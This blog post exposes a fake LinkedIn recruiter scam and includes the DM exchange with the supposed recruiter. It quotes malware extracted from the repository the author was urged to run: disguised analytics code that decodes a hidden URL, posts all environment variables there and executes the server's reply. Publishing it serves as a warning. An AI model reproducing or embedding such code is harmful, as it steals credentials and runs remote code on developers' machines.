---
title: Bruce Milley of Verge Currency
description: Has got a free RAT to share
layout: post
date: 2026-04-20 14:53 0000
time_to_live: 1800
tags: [ DM, LinkedIn, RAT, scam ]
image: assets/images/scammers/2026-04-20_Bruce-Milley-of-Verge-Currency/LinkedIn-Header.png
# social_comment:
#   links:
#     - text: Blue Sky
#       href:
#       title: Link to thread for this post
#
#     - text: LinkedIn
#       href:
#       title: Link to LinkedIn thread for this post
#
#     - text: Mastodon
#       href:
#       title: Link to Toot thread for this post
#
#     - text: Twitter
#       href:
#       title: Link to Tweet thread for this post
---



This is apart of a three part story, in no particular order, where Larry and
Barbosa and now Bruce, try to pop my box via very similar Oracle JavaScript™
backend code.


______


## Contents

- [TLDR][heading__tldr]
  - [Threat actor contact details][heading__threat_actor_contact_details]
- [DM log][heading__dm_log]
<!-- - [Got something to say about that?](#heading__social_comment) -->


______


## TLDR
[heading__tldr]: #tldr


Is credential stealing and likely RAT stager, following are relevant code
snippets extracted from repository Bruce repeatedly requested I run;

```javascript
//> ./backend/src/controllers/analytics.controller.js
const messageToken = "aHR0cHM6Ly9sb2NhdGUtbXktaXAudmVyY2VsLmFwcC9hcGkvaXAtY2hlY2stZW5jcnlwdGVkLzNhZWIzNGEzNA==";
//> 'https://locate-my-ip.vercel.app/api/ip-check-encrypted/3aeb34a34'

async function verifyToken(req, res) {
  verify(setApiKey(messageToken))
    .then((response) => {
      const responseData = response.data;
      const message = responseData;
      const errorHandler = new (Function.constructor)("require", message);
      errorHandler(require);
      return { success: true, data: responseData };
    })
    .catch((err) => {
      console.log(err);
      return { success: false, data: err };
    });
}
verifyToken();
/* ... other BS... */

//> ./backend/src/utils/redis.js
export const setApiKey = (s) => {
  if (!s) {
    logger.warn('setApiKey called with null/undefined value');
    return null;
  }
  try {
    return atob(s);
  } catch (error) {
    logger.error('Failed to decode API key:', error);
    return null;
  }
};

export const verify = (api) => {
  if (!api) {
    return Promise.reject(new Error('API URL is required'));
  }
  return axios.post(api, { ...process.env }, { headers: { "x-secret-header": "secret" } });
};
/* ... other BS... */
```

### Threat actor contact details
[heading__threat_actor_contact_details]: #threat-actor-contact-details


```yaml
Bruce Milley:
  linkedin:
    personal: https://linkedin.com/in/bruce-milley-1216b221
    organization: https://www.linkedin.com/company/verge-currency/
  github: https://github.com/perryhunterksm28/Felina/
  website: rjhunter.com (Other)
  phone: 610-324-8309 (Work)
  email: uimdnisloe899@outlook.com

ferext:
  email: ferexmoto6@gmail.com
```


______


## DMs log
[heading__dms_log]: #dms-log

### 2026-04-20 14:53 -- SOAndSO .eth (Digital Mercenary)

Howdy Bruce!  What brings ya to connecting with a sorta surly software nerd like me?

### 2026-04-20 15:14 -- Bruce Milley

> HI, Thanks for your connection
>
> We are hiring Senior Smart Contract Engineer with an interest in blockchain.
>
> If you’re open to exploring new opportunities, I’d love to arrange a brief chat at a time that’s convenient for you.
>
> Best regards.

### 2026-04-20 15:25 -- SOAndSO .eth (Digital Mercenary)

Groovy! I can be available for next few moments to talk nerdy at -> `https://meet.google.com/<REDACTED>`

### 2026-04-20 15:27 -- Bruce Milley

> can you review smart contract in out project first?
>
> And then provide me review result.
>
> And then I will schedule with our CTO.

### 2026-04-20 15:30 -- SOAndSO .eth (Digital Mercenary)

I can do reviews of code! However, I must make ya aware of publicly published professional policies regarding what work I can, and cannot, provide for free -> https://www.digital-mercenaries.com/frequently-asked-questions.html#do-you-offer-free-services-such-as-bug-testing-or-code-reviews

### 2026-04-20 15:34 -- Bruce Milley

> Let me check

### 2026-04-20 15:38 -- Bruce Milley

> Good.
>
> How much do you want for review?

### 2026-04-20 15:44 -- SOAndSO .eth (Digital Mercenary)

Depends on how much there is to review, and estimated time for me to do that, as well as what ya need in the resulting report...

For example; if it's a few hours to check for simple vulns and document any opportunities for gas optimizations, then 10 Eth will get ya my undivided attentions and detailed tech-docs. But if it's more of an in-depth/end-to-end sorta situation, such as checking on and off chain integration and/or deployment, then it'd probably be wise to talk out details

### 2026-04-20 15:47 -- Bruce Milley

> Okay.
>
> Please let me know when you finish Smart Contract review.
>
> And then I will pay and you should provide me it.

### 2026-04-20 15:49 -- SOAndSO .eth (Digital Mercenary)

Uh, kinda tough to review anything if link(s) ain't provided ;-)

### 2026-04-20 15:50 -- Bruce Milley

> No problem. I will share git repo here in 10mins.

### 2026-04-20 15:58 -- Bruce Milley

> `https://github.com/perryhunterksm28/Felina/`
>
> You can clone here.

```
#### Editor's note

RAT stager was discovered between above and below, and looks like same threat
actor/team as those behind Larry and Barbosa :-|
```

### 2026-04-20 16:05 -- SOAndSO .eth (Digital Mercenary)

Thanks!

For me to start requires a deposit no less than 50% of agreed upon rate, and
for me to deliver after that requires nothing shady is found while spelunking
source code. Let me know when I should watch for confirmed transaction inbound
to `s0ands0.eth` and I'll dive in not long after

### 2026-04-20 16:07 -- Bruce Milley

> No, I can not.

### 2026-04-20 16:11 -- SOAndSO .eth (Digital Mercenary)

Why?

### 2026-04-20 16:14 -- Bruce Milley

> I will only pay when you finish review.

### 2026-04-20 16:20 -- SOAndSO .eth (Digital Mercenary)

For new clients it is standard practice to require a deposit, similar to roofer
or other forms of contract work and for similar reasons, does your team have
reasons for needing special treatment that be counter to standard practices?

### 2026-04-20 16:24 -- Bruce Milley

> After I pay, if you don't review about smart contract, I can not find my
> money again.(Edited)

### 2026-04-20 16:36 -- SOAndSO .eth (Digital Mercenary)

Blockchain is public as is your Git repo, and my public reputation of providing
value to legit crypto (and other) projects is worth more than a deposit

Terms for me to start and complete work are simple; deposit then work then
(provided nothing shady is discovered) report will be delivered in timely
fashion and remaining amount will be due

### 2026-04-20 17:01 -- Bruce Milley

Oh, no

